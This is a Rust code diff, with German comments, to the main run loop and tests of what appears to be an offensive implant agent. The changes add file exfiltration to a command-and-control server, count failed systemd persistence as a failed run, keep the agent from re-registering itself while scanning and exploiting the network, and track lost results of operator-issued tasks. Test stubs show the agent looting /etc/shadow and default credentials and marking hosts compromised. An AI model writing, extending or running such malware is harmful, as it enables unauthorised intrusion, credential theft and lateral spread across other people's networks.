@@ -143,14 +143,41 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
         let mut ergebnis = meldung::melde(self.port, self.sealer, &[eigener_fund]);
         ergebnis.beute_nicht_extrahiert = lokale.fehler.len();
 
-        // 2. Persistenz installieren.
+        // 1b. Datei-Beute des eigenen Hosts: KXENC-Container neben das
+        //     Original, Meldung an den C2 (Issue #31). Ohne --exfil-file
+        //     ist die Liste leer und der Schritt ein No-op.
+        let dateien = crate::datei::exfiltriere_dateien(
+            self.port,
+            self.sealer,
+            &host_id,
+            &self.args.exfil_file,
+        );
+        ergebnis.dateien_uebertragen += dateien.uebertragen;
+        ergebnis.dateien_verloren += dateien.verloren;
+
+        // 2. Persistenz installieren. Ein Fehlschlag gehoert in die Bilanz:
+        //    ohne Persistenz ueberlebt der Agent keinen Neustart — der Lauf
+        //    darf nicht als Erfolg gelten (Issue #69).
         match self.install_persistenz().await {
             Ok(()) => info!("Persistenz installiert"),
-            Err(e) => error!("Persistenz-Installation fehlgeschlagen: {e}"),
+            Err(e) => {
+                error!("Persistenz-Installation fehlgeschlagen: {e}");
+                ergebnis.persistenz_fehlgeschlagen = true;
+            }
         }
 
         // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
-        let entdeckt = self.entdecken().await;
+        //    Der eigene Host wird herausgefiltert: der Agent hat sich oben
+        //    schon registriert. Faende er sich im Scanbereich wieder, wuerde
+        //    er sich ein zweites Mal melden — und der Status `agent` ginge
+        //    im Dashboard verloren (Issue #69).
+        let eigene_ip = std::net::IpAddr::V4(self.args.own_ip);
+        let entdeckt: Vec<DiscoveredHost> = self
+            .entdecken()
+            .await
+            .into_iter()
+            .filter(|h| h.ip != eigene_ip)
+            .collect();
         let relay_script =
             resolve_relay_script(&self.args.relay_script, binary_verzeichnis().as_deref());
         let funde = self
@@ -163,9 +190,17 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
 
         // 5. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
         //    `POST /api/tasks/new` angelegt; der Agent holt sie,
-        //    fuehrt sie aus und meldet das Ergebnis zurueck.
+        //    fuehrt sie aus und meldet das Ergebnis zurueck. Die Bilanz
+        //    unterscheidet ausgefuehrt und berichtet — ein Ergebnis, das den
+        //    Operator nicht erreicht, ist verloren (Issue #69).
         match tasks::run_pending_tasks(self.port, &host_id).await {
-            Ok(count) => info!("{count} Tasks ausgefuehrt"),
+            Ok(bilanz) => {
+                info!(
+                    "{} Task-Ergebnisse berichtet ({} ausgefuehrt)",
+                    bilanz.berichtet, bilanz.ausgefuehrt
+                );
+                ergebnis.tasks_verloren += bilanz.verloren;
+            }
             Err(e) => error!("Task-Abholung fehlgeschlagen: {e}"),
         }
 
@@ -394,6 +429,14 @@ mod tests {
         fn melde_task_ergebnis(&self, _report: &TaskResultRequest) -> Result<(), TransportError> {
             Ok(())
         }
+
+        fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
+            self.aufrufe
+                .lock()
+                .unwrap()
+                .push(format!("datei:{}", upload.host_id));
+            Ok(())
+        }
     }
 
     /// Eine Umgebung, bei der eine Quelle nicht lesbar war.
@@ -467,6 +510,7 @@ mod tests {
             relay_script: "assets/smbrelayx.py".into(),
             server_cert: "/tmp/kx-server.crt".into(),
             server_key: None,
+            exfil_file: Vec::new(),
         }
     }
 
@@ -544,5 +588,216 @@ mod tests {
             "der Fehler ist verschwunden"
         );
         assert_eq!(ergebnis.beute_uebertragen, 1, "die lesbaren Stuecke fehlen");
+        assert!(
+            ergebnis.fehlgeschlagen(),
+            "eine kaputte Extraktion darf nicht als Erfolg durchgehen (Issue #71)"
+        );
+    }
+
+    /// Ein gemeinsames Journal: Port und Umgebung schreiben ihre Schritte
+    /// hinein — damit ist die **ganze** Reihenfolge des Laufs pruefbar,
+    /// nicht nur die Meldungen (Issue #69).
+    type Journal = std::sync::Arc<Mutex<Vec<String>>>;
+
+    struct JournalPort {
+        journal: Journal,
+        tasks: Vec<Task>,
+        task_report_fehler: bool,
+    }
+
+    impl JournalPort {
+        fn neu(journal: Journal) -> Self {
+            JournalPort {
+                journal,
+                tasks: Vec::new(),
+                task_report_fehler: false,
+            }
+        }
+    }
+
+    impl C2Port for JournalPort {
+        fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
+            self.journal
+                .lock()
+                .unwrap()
+                .push(format!("host:{}", req.host_id));
+            Ok(())
+        }
+        fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
+            self.journal
+                .lock()
+                .unwrap()
+                .push(format!("beute:{}", upload.host_id));
+            Ok(())
+        }
+        fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
+            self.journal.lock().unwrap().push("tasks".into());
+            Ok(self.tasks.clone())
+        }
+        fn melde_task_ergebnis(&self, _report: &TaskResultRequest) -> Result<(), TransportError> {
+            if self.task_report_fehler {
+                return Err(TransportError::Http("kein Ergebnis".into()));
+            }
+            Ok(())
+        }
+        fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
+            self.journal
+                .lock()
+                .unwrap()
+                .push(format!("datei:{}", upload.host_id));
+            Ok(())
+        }
+    }
+
+    struct JournalUmgebung {
+        journal: Journal,
+        persistenz_fehler: bool,
+        entdeckt: Mutex<Vec<DiscoveredHost>>,
+    }
+
+    impl JournalUmgebung {
+        fn neu(journal: Journal) -> Self {
+            JournalUmgebung {
+                journal,
+                persistenz_fehler: false,
+                entdeckt: Mutex::new(Vec::new()),
+            }
+        }
+    }
+
+    impl Umgebung for JournalUmgebung {
+        async fn lokale_beute(&self) -> LokaleBeute {
+            LokaleBeute {
+                stuecke: vec![Secret::new("shadow", "root", "hash", "/etc/shadow")],
+                fehler: Vec::new(),
+            }
+        }
+        async fn funde_im_netz(
+            &self,
+            entdeckt: &[DiscoveredHost],
+            _relay_script: &str,
+        ) -> Vec<HostFund> {
+            self.journal.lock().unwrap().push("netz".into());
+            *self.entdeckt.lock().unwrap() = entdeckt.to_vec();
+            vec![HostFund {
+                host_id: "10.0.0.5".into(),
+                ip: "10.0.0.5".into(),
+                os: Some("Linux".into()),
+                status: kx_core::c2::STATUS_COMPROMISED.to_string(),
+                secrets: vec![Secret::new("password", "root", "pw", "default_creds")],
+            }]
+        }
+        async fn install_persistenz(&self, _invocation: &Invocation) -> Result<(), String> {
+            self.journal.lock().unwrap().push("persistenz".into());
+            if self.persistenz_fehler {
+                return Err("systemd nicht erreichbar".into());
+            }
+            Ok(())
+        }
+    }
+
+    /// Die ganze Reihenfolge: eigene Beute melden, Persistenz installieren,
+    /// Netz durchsuchen, Funde melden, Tasks abarbeiten (Issue #69).
+    #[tokio::test]
+    async fn der_lauf_haelt_die_ganze_reihenfolge_ein() {
+        let journal: Journal = Default::default();
+        let port = JournalPort::neu(journal.clone());
+        let umgebung = JournalUmgebung::neu(journal.clone());
+        let args = args();
+        let lauf = Lauf::new(&args, &port, None, &umgebung);
+        let ergebnis = lauf.start().await;
+
+        assert_eq!(
+            *journal.lock().unwrap(),
+            vec![
+                "host:192.168.1.100",
+                "beute:192.168.1.100",
+                "persistenz",
+                "netz",
+                "host:10.0.0.5",
+                "beute:10.0.0.5",
+                "tasks",
+            ],
+            "die Reihenfolge des Laufs ist gebrochen"
+        );
+        assert!(!ergebnis.fehlgeschlagen());
+    }
+
+    /// Eine fehlgeschlagene Persistenz macht den Lauf zum Fehlschlag —
+    /// Exit 0 waere eine falsche Erfolgszusage (Issue #69).
+    #[tokio::test]
+    async fn eine_fehlgeschlagene_persistenz_zaehlt_in_die_bilanz() {
+        let journal: Journal = Default::default();
+        let port = JournalPort::neu(journal.clone());
+        let mut umgebung = JournalUmgebung::neu(journal.clone());
+        umgebung.persistenz_fehler = true;
+        let args = args();
+        let lauf = Lauf::new(&args, &port, None, &umgebung);
+        let ergebnis = lauf.start().await;
+
+        assert!(ergebnis.persistenz_fehlgeschlagen);
+        assert!(
+            ergebnis.fehlgeschlagen(),
+            "ein Lauf ohne Persistenz darf nicht als Erfolg durchgehen"
+        );
+    }
+
+    /// Ein Task-Ergebnis, das der Server nicht annimmt, fliesst in die
+    /// Bilanz des Laufs ein (Issue #69).
+    #[tokio::test]
+    async fn ein_verlorenes_task_ergebnis_zaehlt_in_die_bilanz() {
+        let journal: Journal = Default::default();
+        let mut port = JournalPort::neu(journal.clone());
+        port.tasks = vec![Task {
+            id: "t1".into(),
+            host_id: "192.168.1.100".into(),
+            command: "echo kx".into(),
+            status: kx_core::c2::STATUS_PENDING.into(),
+            result: String::new(),
+            created_at: "2026-11-25T00:00:00Z".into(),
+        }];
+        port.task_report_fehler = true;
+        let umgebung = JournalUmgebung::neu(journal.clone());
+        let args = args();
+        let lauf = Lauf::new(&args, &port, None, &umgebung);
+        let ergebnis = lauf.start().await;
+
+        assert_eq!(ergebnis.tasks_verloren, 1);
+        assert!(ergebnis.fehlgeschlagen());
+    }
+
+    /// Findet der Agent sich selbst im Scanbereich, meldet er sich nicht
+    /// ein zweites Mal — sein Host ist schon registriert (Issue #69).
+    #[tokio::test]
+    async fn der_eigene_host_wird_nicht_doppelt_registriert() {
+        let journal: Journal = Default::default();
+        let port = JournalPort::neu(journal.clone());
+        let umgebung = JournalUmgebung::neu(journal.clone());
+        let mut args = args();
+        // Die eigene IP steht in der vorgegebenen Host-Liste.
+        args.hosts = Some(vec![
+            "192.168.1.100".parse().unwrap(),
+            "192.168.1.5".parse().unwrap(),
+        ]);
+        let lauf = Lauf::new(&args, &port, None, &umgebung);
+        let ergebnis = lauf.start().await;
+
+        let eigene = journal
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|schritt| *schritt == "host:192.168.1.100")
+            .count();
+        assert_eq!(eigene, 1, "der eigene Host wurde doppelt registriert");
+        assert!(
+            !umgebung
+                .entdeckt
+                .lock()
+                .unwrap()
+                .iter()
+                .any(|h| h.ip == std::net::IpAddr::V4(args.own_ip)),
+            "der eigene Host ging in die Netzwerk-Phase"
+        );
+        assert_eq!(ergebnis.hosts_registriert, 2, "Agent plus ein Fund");
     }
 }
